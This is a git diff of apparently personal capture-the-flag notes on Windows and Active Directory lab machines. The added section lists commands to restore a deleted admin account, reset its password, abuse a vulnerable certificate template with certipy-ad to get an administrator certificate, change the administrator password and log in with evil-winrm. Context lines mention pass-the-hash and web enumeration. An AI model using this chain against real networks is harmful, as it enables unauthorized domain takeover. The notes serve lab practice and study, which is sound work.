@@ -33,10 +33,39 @@ and you get the files
 Then use bloodhund to find the connections and then use impacet tools.
 
 ---------------------------------------------------------------------------------------------------------
-## An all around windows check guide
+## Prevelage escalation
 
-1. you do the normal scans (nmap for tcp and udp, rustscan)
-2. 
+you are in as user at this point
+
+1. if its AD check for deleted files: Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects
+   
+2. Restore-ADObject -Identity 938182c3-bf0b-410a-9aaa-45c8e1a02ebf      (restore the cert_admin)
+   
+3. Enable-ADAccount -Identity cert_admin
+
+4. Set-ADAccountPassword -Identity cert_admin -Reset -NewPassword (ConvertTo-SecureString "P@ssword123!" -AsPlainText -Force)
+
+   so you enabled and reset the password for thus admin cert.
+ next steps: Find vulnerable templates,
+Request certificate with admin UPN,
+Authenticate using certificate,
+Change administrator password,
+WinRM to gain root access,
+
+5. certipy-ad find -u cert_admin@domain.htb -p 'P@ssword123!' -dc-ip ip -vulnerable         (at your machine)
+
+6. certipy-ad req -dc-ip ip -ca 'domain-CA-1' -target-ip ip -u cert_admin@domain.htb -p 'P@ssword123!' -template WebServer -upn administrator@domain.htb -application-policies 'Client Authentication'
+
+7. certipy-ad auth -pfx administrator.pfx -dc-ip ip -domain domain.htb -ldap-shell
+
+8. > help
+   or just:
+   > change_password administrator Password@123
+
+and then just evil-winrm it
+
+
+
 
 
 ---------------------------------------------------------------------------------------------------------
@@ -143,7 +172,7 @@ faketime '2025-05-27 20:46:00' certipy-ad auth -pfx administrator.pfx -username 
 evil-winrm -i targetIP -u administrator -H 'hash' 
 
 -------------------------------------------------------------------------------------------------------------------------------------------------------
-(NO CREDS WINDOWS MACHINE)
+##(NO CREDS WINDOWS MACHINE)
 1. you need good enumeration + create an account at the website:
    gobuster dir ....... +x php   (windows site usually have .php files)
    ffuf ...... 
